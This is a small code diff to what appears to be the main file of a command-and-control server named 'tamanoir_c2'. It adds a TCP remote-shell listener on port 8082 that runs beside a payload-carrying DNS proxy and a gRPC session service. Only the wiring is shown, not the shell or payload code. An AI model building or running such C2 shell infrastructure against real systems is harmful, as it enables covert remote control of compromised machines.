@@ -5,6 +5,7 @@ use tamanoir_c2::{
     dns_proxy::DnsProxy,
     grpc::serve_tonic,
     rce::{builder::build, tester::test_bin},
+    tcp_shell::TcpShell,
     SessionsStore,
 };
 
@@ -41,9 +42,11 @@ async fn main() -> anyhow::Result<()> {
         } => {
             let dns_proxy = DnsProxy::new(dns_port, dns_forward_ip, dns_payload_len);
             let sessions_store = SessionsStore::new();
+            let mut remote_shell = TcpShell::new(8082);
             tokio::try_join!(
                 dns_proxy.serve(sessions_store.clone()),
-                serve_tonic(grpc_port, sessions_store.clone())
+                serve_tonic(grpc_port, sessions_store.clone()),
+                remote_shell.serve()
             )?;
         }
     }
